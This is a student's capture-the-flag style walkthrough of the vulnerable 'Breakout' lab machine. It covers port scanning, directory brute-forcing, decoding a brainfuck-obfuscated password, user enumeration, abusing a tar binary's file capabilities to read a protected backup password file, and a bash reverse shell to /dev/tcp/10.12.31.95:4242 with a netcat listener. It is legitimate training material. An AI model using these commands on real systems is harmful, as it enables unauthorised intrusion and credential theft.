LAB BREAKOUT
Name: Tran Le Anh Quan
Step 1: download from vulhub then run the machine on Vmware
 
Step 2: Then after have machine ID, the next step is find out available port and service on machine. We will use nmap to do this. Command used : nmap 192.168.1.16 -p- -sV
 
As we can see, port 80,139,445,10000 and 20000 opened and we had http and netbios-ssn service.
Step 3: try to open the web of this ip ( port 80) , we have this
 
This mean, http service is enabled on the apache service but the webroot might be different, so we need to find out the correct path behind the port to access the web application.
To scan , we can use dirb tool to brute force and use this command 
dirb http://192.168.1.16
 
At http://192.168.1.16, if we look at the html source we will see this
 
The encrypted password is  : 
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.—-.<++++++++++.———–.>———–.++++.<<+.>-.——–.++++++++++++++++++++.<————.>>———.<<++++++.++++++.
After research google , we can define that this is encode using brainfuck language. Then, find a tool to decrypt it
 
Password : .2uqPEfj3D<P’a-3
Then try to open the target machine on port 20000
 
There was a login page for user admin.  To find out username we can use enum4linux tool to find out username
Command : enum4linux -a 192.168.1.16
 
After scan, we have this username  
Then try it on web
 
Then it work
 
Open the web command 
 
 
We ran the ‘id’ command to check the user information. We have terminal access as user ‘cyber’ as confirmed by the output of the ‘id’ command. We used the ls command to check the current directory contents and found our first flag. The flag file named ‘user.txt’ is given in the previous image. In the next step, we will be taking the command shell of the target machine.
 
Cd to var, then in var, we can see a folder name backup, go to it cd backups
 
You can see .old_pass, but you can’t read it.
Go back to home cd /home/cyber
Here you can see tar and user.txt. 
Run this command : getcap tar we have this 
 
 
Then run this command   ./tar -cf bak.tar /var/backups/.old_pass.bak to create a file bak.tar
 
 
Then  tar -xf bak.tar we can see folder var
Now go to it and read out  old_pass.bak
 
 we have password but we can’t get in 
So go to Reverse Shell Cheat sheet and use this command : bash -i >& /dev/tcp/10.12.31.95/4242 0>&1 
This is my ip
 
And on our machine using nc -lvnp 4242
 
Then we can login with the password below
 


